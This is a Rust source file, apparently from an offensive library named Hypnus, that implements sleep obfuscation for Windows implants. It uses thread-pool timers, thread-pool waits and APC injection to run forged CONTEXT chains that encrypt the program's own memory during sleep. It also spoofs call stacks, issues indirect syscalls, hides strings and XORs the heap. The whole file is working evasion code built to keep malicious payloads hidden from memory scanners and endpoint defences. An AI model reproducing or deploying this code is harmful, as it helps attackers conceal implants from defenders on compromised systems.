use alloc::string::String;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut};

use uwd::AsPointer;
use anyhow::{Result, bail};
use obfstr::{obfstr as obf, obfstring as s};
use dinvk::{NtCurrentProcess, NtCurrentThread, NT_SUCCESS};
use dinvk::data::{
    LARGE_INTEGER, CONTEXT,
    EVENT_ALL_ACCESS, EVENT_TYPE, NTSTATUS
};

use super::data::*;
use super::{
    allocator::HypnusHeap,
    utils::*,
};

/// Initiates execution obfuscation using the `TpSetTimer`.
///
/// # Arguments
///
/// * `$base` - Base address of the memory region to encrypt/decrypt.
/// * `$size` - Size (in bytes) of the memory region.
/// * `$time` - Delay in seconds before resuming execution.
/// * `$mode` - Obfuscation mode.
#[macro_export]
macro_rules! timer {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `TpSetWait`.
///
/// # Arguments
///
/// * `$base` - Base address of the memory region to encrypt/decrypt.
/// * `$size` - Size (in bytes) of the memory region.
/// * `$time` - Delay in seconds before resuming execution.
/// * `$mode` - Obfuscation mode.
#[macro_export]
macro_rules! wait {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `NtQueueApcThread`.
///
/// # Arguments
///
/// * `$base` - Base address of the memory region to encrypt/decrypt.
/// * `$size` - Size (in bytes) of the memory region.
/// * `$time` - Delay in seconds before resuming execution.
/// * `$mode` - Obfuscation mode.
#[macro_export]
macro_rules! foliage {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::internal::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $mode
        )
    };
}

/// Enumeration of supported memory obfuscation strategies.
pub enum Obfuscation {
    /// The technique using Windows thread pool (`TpSetTimer`).
    Timer,

    /// The technique using Windows thread pool (`TpSetWait`).
    Wait,

    /// The technique using APC (`NtQueueApcThread`).
    Foliage,
}

/// Represents bit-by-bit options for performing obfuscation in different modes
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(transparent)]
pub struct ObfMode(pub u32);

impl ObfMode {
    /// Does not activate any modes
    pub const None: Self = ObfMode(0b0000);
    
    /// Heap encryption mode
    pub const Heap: Self = ObfMode(0b0001);

    /// Mode of use for RWX protection
    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether this mode includes another [`ObfMode`] flag.
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

impl core::ops::BitOr for ObfMode {
    type Output = Self;

    /// Combines two [`ObfMode`] instances using a bitwise OR operation.
    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// Base memory pointer to be manipulated or operated on.
    base: u64,

    /// Size of the memory region.
    size: u64,

    /// Delay time in seconds.
    time: u64,

    /// Resolved WinAPI functions required for execution.
    cfg: &'static Config,

    /// Obfuscation modes.
    mode: ObfMode,
}

impl Hypnus {
    /// Creates a new `Hypnus`.
    ///
    /// # Arguments
    ///
    /// * `base` - Memory region to encrypt/decrypt.
    /// * `size` - The size (in bytes) of the memory region.
    /// * `time` - Delay (in seconds) to wait before resuming execution after encryption.
    /// * `mode` - Optional [`ObfMode`] for stack/heap layout changes.
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            bail!(s!("Invalid arguments"))
        }

        Ok(Self {
            base,
            size,
            time,
            mode,
            cfg: init_config()?,
        })
    }

    /// Performs memory obfuscation using a threadpool timer-based.
    fn timer(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Initialize two synchronization events
            let mut events = [null_mut(); 3];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Create dedicated thread pool with a single thread
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Sets custom stack size for the thread pool
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Configure callback environment to use the custom pool
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // First timer: capture current context
            let mut timer_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocTimer(
                &mut timer_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetTimer(timer_ctx, &mut delay, 0, 0);

            // Second Timer: Signal event to confirm context capture
            let mut timer_event = null_mut();
            status = TpAllocTimer(
                &mut timer_event, 
                NtSetEvent2 as *mut c_void, 
                events[0], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetTimer(timer_event, &mut delay, 0, 0);

            // Wait for the event to be set after context capture
            status = NtWaitForSingleObject(events[0], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate current thread handle for context manipulation
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep primitive using the current thread handle and a delay
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Notify that the obfuscation steps 
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[2] as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule CONTEXT chain execution via TpSetTimer + NtContinue
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    &mut timer, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocTimer Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread pool finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using threadpool wait objects.
    fn wait(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create synchronization events
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Create dedicated thread pool with a single thread
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Sets custom stack size for the thread pool
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Configure callback environment to use the custom pool
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // First timer: capture current context
            let mut wait_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocWait(
                &mut wait_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );

            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetWait(wait_ctx, events[0], &mut delay);

            // Second Timer: Signal event to confirm context capture
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event, 
                NtSetEvent2 as *mut c_void, 
                events[1], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for the event to be set after context capture
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Get handle to current thread
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep primitive using the current thread handle and a delay
            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
            ctxs[5].Rcx = h_thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread contex
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Notify that the obfuscation steps
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[3] as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Schedule CONTEXTs on timer with staggered delays
            for ctx in &mut ctxs {
                let mut wait = null_mut();
                status = TpAllocWait(
                    &mut wait, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocWait Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetWait(wait, events[0], &mut delay);
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread pool finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using APC injection and hijacked thread contexts.
    fn foliage(&mut self) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Create a manual-reset synchronization event to be signaled after execution
            let mut event = null_mut();
            let mut status = NtCreateEvent(
                &mut event, 
                EVENT_ALL_ACCESS, 
                null_mut(), 
                EVENT_TYPE::SynchronizationEvent, 
                0
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateEvent Failed"));
            }

            // Create a new thread in suspended state for APC injection
            let mut h_thread = null_mut::<c_void>();
            status = uwd::syscall!(
                obf!("NtCreateThreadEx"),
                h_thread.as_ptr_mut(),
                THREAD_ALL_ACCESS,
                null_mut::<c_void>(),
                NtCurrentProcess(),
                (self.cfg.tp_release_cleanup.as_ptr()).add(0x250),
                null_mut::<c_void>(),
                1,
                0,
                0x1000 * 20,
                0x1000 * 20,
                null_mut::<c_void>()
            )? as NTSTATUS;

            if !NT_SUCCESS(status) {
                bail!(s!("NtCreateThreadEx Failed"));
            }

            // Get the initial context of the suspended thread
            let mut ctx_init = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            status = uwd::syscall!(obf!("NtGetContextThread"), h_thread, ctx_init.as_ptr_mut())? as NTSTATUS;
            if !NT_SUCCESS(status) {
                bail!(s!("NtGetContextThread Failed"));
            }

            // Clone the base context 10 times for the full spoofed execution chain
            let mut ctxs = [ctx_init; 10];

            // Duplicate the current thread handle
            let mut thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Preparing for call stack spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].Rip = self.cfg.nt_wait_for_single.into();
            ctxs[0].Rcx = event as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporarily makes the target memory region writable before encryption
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypts or masks the specified memory region
            ctxs[2].Rip = self.cfg.system_function040.into();
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Saves the original CONTEXT so it can be restored later
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].Rip = self.cfg.nt_get_context_thread.into();
            ctxs[3].Rcx = thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Injects a spoofed CONTEXT to modify return flow (stack/frame spoofing)
            ctxs[4].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[4].Rcx = thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep primitive using the current thread handle and a delay
            ctxs[5].Rip = self.cfg.wait_for_single.into();
            ctxs[5].Rcx = thread as u64;
            ctxs[5].Rdx = self.time * 1000;
            ctxs[5].R8  = 0;

            // Decrypts (unmasks) the memory after waking up
            ctxs[6].Rip = self.cfg.system_function041.into();
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restores the memory protection after decryption.
            ctxs[7].Rip = self.cfg.nt_protect_virtual_memory.into();
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restores the original thread context
            ctxs[8].Rip = self.cfg.nt_set_context_thread.into();
            ctxs[8].Rcx = thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Gracefully terminates the helper thread after all steps are complete.
            ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
            ctxs[9].Rcx = h_thread as u64;
            ctxs[9].Rdx = 0;

            // Layout the entire spoofed CONTEXT chain on the stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;

            // Write `old_protect` values into the expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());

            // Queue each CONTEXT as an APC to be executed in sequence
            for ctx in &mut ctxs {
                status = NtQueueApcThread(
                    h_thread,
                    self.cfg.nt_continue.as_ptr().cast_mut(),
                    ctx as *mut _ as *mut c_void,
                    null_mut(),
                    null_mut(),
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("NtQueueApcThread Failed"));
                }
            }

            // Trigger the APC chain by resuming the thread in alertable state
            status = NtAlertResumeThread(h_thread, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtAlertResumeThread Failed"));
            }

            // If heap obfuscation is enabled, encrypt memory before execution
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait until the thread finishes the spoofed chain
            status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Clean up all handles
            NtClose(event);
            NtClose(h_thread);
            NtClose(thread);
        }

        Ok(())
    }
}

/// Internal module responsible for launching obfuscated execution flows.
pub mod internal {
    use alloc::boxed::Box;
    use super::*;

    /// Structure passed to the fiber containing the [`Hypnus`].
    struct FiberContext {
        hypnus: Box<Hypnus>,
        obf: Obfuscation,
        master: *mut c_void,
    }

    /// Trampoline function executed inside the fiber.
    ///
    /// It unpacks the [`FiberContext`], runs the selected obfuscation method,
    /// and optionally logs errors in debug mode.
    extern "system" fn hypnus_fiber(ctx: *mut c_void) {
        unsafe {
            let mut ctx = Box::from_raw(ctx as *mut FiberContext);
            let _result = match ctx.obf {
                Obfuscation::Timer   => ctx.hypnus.timer(),
                Obfuscation::Wait    => ctx.hypnus.wait(),
                Obfuscation::Foliage => ctx.hypnus.foliage(),
            };

            #[cfg(debug_assertions)]
            if let Err(_error) = _result {
                dinvk::println!("[Hypnus] {:?}", _error);
            }

            SwitchToFiber(ctx.master);
        }
    }

    /// Execution sequence using the specified obfuscation strategy.
    ///
    /// # Arguments
    ///
    /// * `base` - Memory region to encrypt/decrypt.
    /// * `size` - Size of the memory region in bytes.
    /// * `time` - Time (in seconds) to wait before decrypting/resuming.
    /// * `obf` - Chosen obfuscation strategy.
    /// * `mode` - Optional [`ObfMode`] for stack/heap layout changes.
    pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
        // Converts the current thread to a fiber so we can switch to another fiber manually
        let master = ConvertThreadToFiber(null_mut());
        if master.is_null() {
            return;
        }

        // Initializes the `Hypnus` structure, responsible for applying sleep or obfuscation
        match Hypnus::new(base as u64, size, time, mode) {
            Ok(hypnus) => {
                // Creates the context to be passed into the new fiber.
                // This includes the `Hypnus` object, obfuscation mode, and a reference to the master fiber.
                let fiber_ctx = Box::new(FiberContext {
                    hypnus: Box::new(hypnus),
                    obf,
                    master,
                });

                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
                // The context is passed as a raw pointer to the entry point.
                let fiber = CreateFiber(
                    0x100000, 
                    Some(hypnus_fiber), 
                    Box::into_raw(fiber_ctx).cast()
                );
                
                if fiber.is_null() {
                    return;
                }

                // Switches execution to the new fiber
                SwitchToFiber(fiber);

                // Once execution returns, the fiber is deleted
                DeleteFiber(fiber);

                // Converts the fiber back into a regular thread
                ConvertFiberToThread();
            }
            Err(_error) => {
                #[cfg(debug_assertions)]
                dinvk::println!("[Hypnus::new] {:?}", _error);
            }
        }
    }
}

trait Asu64 {
    /// Converts `self` to a `u64` representing the pointer value.
    fn as_u64(&mut self) -> u64;
}

impl<T> Asu64 for T {
    fn as_u64(&mut self) -> u64 {
        self as *mut _ as *mut c_void as u64
    }
}

/// Iterates over all entries in the process heap and applies
/// an XOR operation to the data of entries marked as allocated.
///
/// # Arguments
///
/// * `key` - An 8-byte key used to XOR the memory contents for obfuscation.
fn obfuscate_heap(key: &[u8; 8]) {
    let heap = HypnusHeap::heap();
    if heap.is_null() {
        return;
    }

    // Walk through all heap entries
    let mut entry = unsafe { zeroed::<RTL_HEAP_WALK_ENTRY>() };
    while RtlWalkHeap(heap, &mut entry) != 0 {
        // Check if the entry is in use (allocated block)
        if entry.Flags & 4 != 0 {
            xor(entry.DataAddress as *mut u8, entry.DataSize, key);
        }
    }
}

/// Applies an XOR transformation to a memory region using the given key.
///
/// # Arguments
///
/// * `data` - A raw pointer to the beginning of the memory region.
/// * `len` - The length (in bytes) of the memory region.
/// * `key` - An 8-byte key used to XOR the memory contents.
fn xor(data: *mut u8, len: usize, key: &[u8; 8]) {
    if data.is_null() {
        return;
    }

    for i in 0..len {
        unsafe {
            *data.add(i) ^= key[i % key.len()];
        }
    }
}